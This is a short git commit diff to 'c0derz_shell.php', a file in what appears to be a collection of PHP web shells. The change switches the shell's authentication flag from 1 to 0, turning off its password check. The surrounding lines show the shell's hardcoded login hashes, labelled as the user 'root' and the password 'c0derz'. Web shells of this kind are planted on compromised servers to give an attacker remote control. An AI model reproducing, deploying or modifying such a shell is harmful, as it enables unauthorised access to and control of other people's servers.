7ce3d457d807a9bccb6bdfb7d70dae13f33e24ca
Sagnik Mandal <sonalisagnik123@gmail.com>
2020-06-06 11:51:12 +0530

    Update c0derz_shell.php

--- Collection/c0derz_shell.php
+++ Collection/c0derz_shell.php
@@ -24,7 +24,7 @@ $self = $_SERVER['PHP_SELF'];
 $docr = $_SERVER['DOCUMENT_ROOT'];
 $achtung=1;
 //authentification
-$authentification = 1;
+$authentification = 0;
 $name='63a9f0ea7bb98050796b649e85481845';//root
 $pass='5cdbe638246729485a5eab6b93f170e2';//c0derz
 $caption="Enter your login and password";
